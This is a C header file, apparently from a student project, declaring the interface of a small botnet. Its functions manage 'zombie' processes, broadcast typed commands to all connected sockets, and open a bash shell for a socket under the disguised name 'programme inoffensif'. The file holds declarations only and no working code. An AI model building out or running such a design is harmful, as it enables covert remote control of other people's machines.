#ifndef BOT_NET_H
#define BOT_NET_H
#define BUFFERSIZE 256

//
//
//POST 
//
void discussionProcess();


//PRE
//
//POST 
//
void getPortIp(char ip,int numberOfIp);


//
//
//POST 
//
void getConnectedZombie();


//PRE 'tabCommande' is a valid table to put the as a buffer for the read and stock
// the read command
//
//POST the function has read the input and wrote it in each socket in fds
//
void readWriteCommand(char* tabCommande);


//
//
//POST initialize a zombie process
//
void initZombie();

//
//
//POST close the zombies processes
//
void closeZombies();


//PRE witchPort: Indicates whether a port is required
//        portReceived: The port received
//
//POST create a zombie connected to the portReceived
//
//RES return the zombie connected
Zombie initSocketServer(bool withPort, int portReceived);


//PRE sock: a connected socket
//
//POST create a bash terminal and name it "programme inoffensif"
//
void createBash (void * sock);

#endif